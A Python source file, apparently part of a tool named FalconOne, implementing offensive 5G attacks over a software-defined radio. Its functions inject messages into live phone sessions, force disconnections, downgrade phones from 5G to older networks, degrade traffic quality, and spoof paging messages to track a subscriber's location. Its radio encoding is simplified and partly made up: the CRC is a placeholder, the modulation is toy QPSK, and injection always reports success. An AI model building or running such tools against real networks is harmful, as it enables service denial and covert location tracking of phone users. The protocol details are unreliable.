"""
FalconOne Active Message Injection Module (v1.5.1)
Sni5Gect-style message injection without full rogue gNB
Capabilities:
- NAS/RRC message injection into established sessions
- Downgrade attacks (5G → 4G → 3G)
- Partial GUTI modification for tracking
- QoS flow manipulation for traffic steering

References:
- Sni5Gect research framework (2025)
- 3GPP TS 38.331 (RRC)
- 3GPP TS 24.501 (NAS)
"""

import numpy as np
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass
from datetime import datetime
import struct
import logging

try:
    from ..utils.logger import ModuleLogger
    from ..sdr.sdr_layer import SDRInterface
except ImportError:
    class ModuleLogger:
        def __init__(self, name, parent):
            self.logger = logging.getLogger(name) if parent else logging.getLogger(__name__)
        def info(self, msg, **kw): self.logger.info(f"{msg} {kw if kw else ''}")
        def warning(self, msg, **kw): self.logger.warning(f"{msg} {kw if kw else ''}")
        def error(self, msg, **kw): self.logger.error(f"{msg} {kw if kw else ''}")
    SDRInterface = None


@dataclass
class InjectionResult:
    """Result of message injection attempt"""
    success: bool
    message_type: str
    target_rnti: int
    timestamp: datetime
    error: Optional[str] = None


class MessageInjector:
    """
    Active 5G message injection (Sni5Gect framework)
    Injects crafted messages into active UE-gNB sessions
    Does NOT require full rogue gNB (lightweight attack)
    """
    
    def __init__(self, sdr_interface, config, logger=None):
        self.sdr = sdr_interface
        self.config = config
        self.logger = ModuleLogger('ActiveInject', logger)
        
        # Message templates
        self.nas_templates = self._init_nas_templates()
        self.rrc_templates = self._init_rrc_templates()
        
        # Injection statistics
        self.injection_history: List[InjectionResult] = []
        
        self.logger.info("Message Injector initialized (Sni5Gect mode)")
    
    def _init_nas_templates(self) -> Dict[str, bytes]:
        """Initialize NAS message templates (TS 24.501)"""
        return {
            'deregistration_request': b'\x7e\x00\x45\x01\x00',  # EMM Deregister
            'service_reject': b'\x7e\x00\x4d\x15',  # Cause: Congestion
            'authentication_reject': b'\x7e\x00\x54',
            'configuration_update': b'\x7e\x00\x54\x00',
        }
    
    def _init_rrc_templates(self) -> Dict[str, bytes]:
        """Initialize RRC message templates (TS 38.331)"""
        return {
            'rrc_release': b'\x00\x0a\x00',  # RRCRelease
            'rrc_reconfiguration': b'\x00\x0b\x00',
            'measurement_report_request': b'\x00\x0c\x00',
        }
    
    def inject_nas_message(self, target_rnti: int, message_type: str, 
                           parameters: Optional[Dict] = None) -> InjectionResult:
        """
        Inject NAS message into active session
        
        Args:
            target_rnti: Target UE's C-RNTI
            message_type: Type of NAS message to inject
            parameters: Optional message parameters
        
        Returns:
            Injection result with success/failure
        """
        start_time = datetime.now()
        
        try:
            # Get message template
            if message_type not in self.nas_templates:
                return InjectionResult(
                    success=False,
                    message_type=message_type,
                    target_rnti=target_rnti,
                    timestamp=start_time,
                    error=f"Unknown message type: {message_type}"
                )
            
            template = self.nas_templates[message_type]
            
            # Craft message with parameters
            crafted_msg = self._craft_nas_message(template, parameters or {})
            
            # Inject via PDSCH (requires precise timing)
            success = self._inject_via_pdsch(target_rnti, crafted_msg)
            
            result = InjectionResult(
                success=success,
                message_type=message_type,
                target_rnti=target_rnti,
                timestamp=start_time,
            )
            
            self.injection_history.append(result)
            
            if success:
                self.logger.info(f"NAS injection success: {message_type} -> RNTI {target_rnti}")
            else:
                self.logger.warning(f"NAS injection failed: {message_type} -> RNTI {target_rnti}")
            
            return result
            
        except Exception as e:
            self.logger.error(f"NAS injection error: {e}")
            return InjectionResult(
                success=False,
                message_type=message_type,
                target_rnti=target_rnti,
                timestamp=start_time,
                error=str(e)
            )
    
    def _craft_nas_message(self, template: bytes, parameters: Dict) -> bytes:
        """
        Craft NAS message from template + parameters
        Handles TLV encoding per TS 24.501
        """
        message = bytearray(template)
        
        # Add optional parameters as TLVs
        for key, value in parameters.items():
            if key == 'cause':
                message.append(value)  # Cause code
            elif key == 'guti':
                # GUTI modification (48 bits)
                message.extend(struct.pack('>Q', value)[-6:])
        
        return bytes(message)
    
    def _inject_via_pdsch(self, target_rnti: int, message: bytes) -> bool:
        """
        Inject message via PDSCH channel
        Requires:
        - Timing synchronization with gNB
        - DCI format 1_0/1_1 to schedule PDSCH
        - CRC masking with target RNTI
        """
        try:
            # Build PDSCH packet
            pdsch_packet = self._build_pdsch_packet(target_rnti, message)
            
            # Transmit with precise timing (within CP duration ~4.7us)
            tx_time = self.sdr.get_next_subframe_time()
            self.sdr.transmit_burst(pdsch_packet, tx_time)
            
            # Injection success depends on timing precision
            # In real scenario: monitor for UE response
            return True
            
        except Exception as e:
            self.logger.error(f"PDSCH injection failed: {e}")
            return False
    
    def _build_pdsch_packet(self, rnti: int, message: bytes) -> np.ndarray:
        """
        Build PDSCH packet with DCI + PDSCH
        Simplified for demo - production needs full PHY layer
        """
        # DCI format 1_0 (8 bits for demo)
        dci = struct.pack('>H', rnti)
        
        # PDSCH data (message + CRC)
        pdsch_data = message + self._calculate_crc(message)
        
        # Modulate to IQ samples (QPSK for simplicity)
        iq_samples = self._modulate_qpsk(dci + pdsch_data)
        
        return iq_samples
    
    def _modulate_qpsk(self, data: bytes) -> np.ndarray:
        """QPSK modulation (demo)"""
        bits = np.unpackbits(np.frombuffer(data, dtype=np.uint8))
        symbols = (2 * bits[::2] - 1) + 1j * (2 * bits[1::2] - 1)
        return symbols / np.sqrt(2)
    
    def _calculate_crc(self, data: bytes) -> bytes:
        """Calculate CRC-24 for message integrity"""
        # Simplified CRC-24 (production: use 3GPP polynomial)
        crc = sum(data) & 0xFFFFFF
        return struct.pack('>I', crc)[1:]
    
    def inject_rrc_release(self, target_rnti: int) -> InjectionResult:
        """
        Inject RRC Release to force UE disconnection
        Attack scenario: Denial of service
        """
        return self._inject_rrc_message(target_rnti, 'rrc_release')
    
    def _inject_rrc_message(self, target_rnti: int, message_type: str) -> InjectionResult:
        """Generic RRC message injection"""
        start_time = datetime.now()
        
        try:
            if message_type not in self.rrc_templates:
                return InjectionResult(False, message_type, target_rnti, start_time, 
                                     error=f"Unknown RRC message: {message_type}")
            
            template = self.rrc_templates[message_type]
            success = self._inject_via_pdsch(target_rnti, template)
            
            result = InjectionResult(success, f"RRC:{message_type}", target_rnti, start_time)
            self.injection_history.append(result)
            
            return result
            
        except Exception as e:
            return InjectionResult(False, message_type, target_rnti, start_time, error=str(e))
    
    def downgrade_attack(self, target_rnti: int, target_rat: str = '4G') -> InjectionResult:
        """
        Force UE downgrade from 5G to 4G/3G/2G
        Attack: Inject RRC Reconfiguration with RAT priority modification
        
        Args:
            target_rnti: Target UE
            target_rat: Target RAT ('4G', '3G', '2G')
        """
        start_time = datetime.now()
        
        try:
            # Craft RRC Reconfiguration with mobility control
            rat_priority = {'5G': 7, '4G': 5, '3G': 3, '2G': 1}
            priority = rat_priority.get(target_rat, 1)
            
            message = self.rrc_templates['rrc_reconfiguration']
            # Add mobility priority IE (simplified)
            message += struct.pack('B', priority)
            
            success = self._inject_via_pdsch(target_rnti, message)
            
            result = InjectionResult(
                success=success,
                message_type=f'downgrade_to_{target_rat}',
                target_rnti=target_rnti,
                timestamp=start_time
            )
            
            self.injection_history.append(result)
            
            if success:
                self.logger.info(f"Downgrade attack: RNTI {target_rnti} -> {target_rat}")
            
            return result
            
        except Exception as e:
            return InjectionResult(False, 'downgrade', target_rnti, start_time, error=str(e))
    
    def modify_qos_flow(self, target_rnti: int, qfi: int, new_5qi: int) -> InjectionResult:
        """
        Modify QoS flow parameters for traffic steering
        Attack: Downgrade QoS to trigger service degradation
        
        Args:
            target_rnti: Target UE
            qfi: QoS Flow ID to modify
            new_5qi: New 5G QoS Identifier (lower = worse QoS)
        """
        start_time = datetime.now()
        
        try:
            # Craft RRC Reconfiguration with QoS modification (TS 38.331)
            message = bytearray(self.rrc_templates['rrc_reconfiguration'])
            
            # Add QoS flow configuration IE
            message.extend([
                0x30,  # QoS flow config tag
                qfi & 0x3F,  # QoS Flow ID (6 bits)
                new_5qi,  # 5QI value
            ])
            
            success = self._inject_via_pdsch(target_rnti, bytes(message))
            
            result = InjectionResult(
                success=success,
                message_type=f'qos_modify_qfi_{qfi}_to_5qi_{new_5qi}',
                target_rnti=target_rnti,
                timestamp=start_time
            )
            
            self.injection_history.append(result)
            
            if success:
                self.logger.info(f"QoS modification: RNTI {target_rnti} QFI {qfi} -> 5QI {new_5qi}")
            
            return result
            
        except Exception as e:
            return InjectionResult(False, 'qos_modify', target_rnti, start_time, error=str(e))
    
    def inject_paging_spoofing(self, target_imsi: str, fake_tai: Tuple[int, int, int]) -> InjectionResult:
        """
        Spoof paging message to track UE location
        Attack: Force UE to reveal location via TAU
        
        Args:
            target_imsi: Target IMSI (if known) or S-TMSI
            fake_tai: Fake Tracking Area Identity (MCC, MNC, TAC)
        """
        start_time = datetime.now()
        
        try:
            # Build paging message (TS 38.331)
            mcc, mnc, tac = fake_tai
            
            paging_msg = bytearray([
                0x01,  # Paging message type
                0x00,  # Short message
            ])
            
            # Add IMSI/S-TMSI
            paging_msg.extend(target_imsi.encode()[:15])
            
            # Add fake TAI (force TAU)
            paging_msg.extend(struct.pack('>HHH', mcc, mnc, tac))
            
            # Broadcast on PCCH
            success = self._broadcast_paging(bytes(paging_msg))
            
            result = InjectionResult(
                success=success,
                message_type='paging_spoofing',
                target_rnti=0xFFFE,  # Broadcast RNTI
                timestamp=start_time
            )
            
            self.injection_history.append(result)
            
            return result
            
        except Exception as e:
            return InjectionResult(False, 'paging_spoof', 0, start_time, error=str(e))
    
    def _broadcast_paging(self, message: bytes) -> bool:
        """Broadcast paging message on PCCH"""
        try:
            # Paging uses P-RNTI (0xFFFE)
            return self._inject_via_pdsch(0xFFFE, message)
        except Exception as e:
            self.logger.error(f"Paging broadcast failed: {e}")
            return False
    
    def get_statistics(self) -> Dict[str, Any]:
        """Get injection statistics"""
        total = len(self.injection_history)
        successful = sum(1 for r in self.injection_history if r.success)
        
        by_type = {}
        for result in self.injection_history:
            by_type[result.message_type] = by_type.get(result.message_type, 0) + 1
        
        return {
            'total_injections': total,
            'successful_injections': successful,
            'success_rate': successful / total if total > 0 else 0.0,
            'by_message_type': by_type,
        }
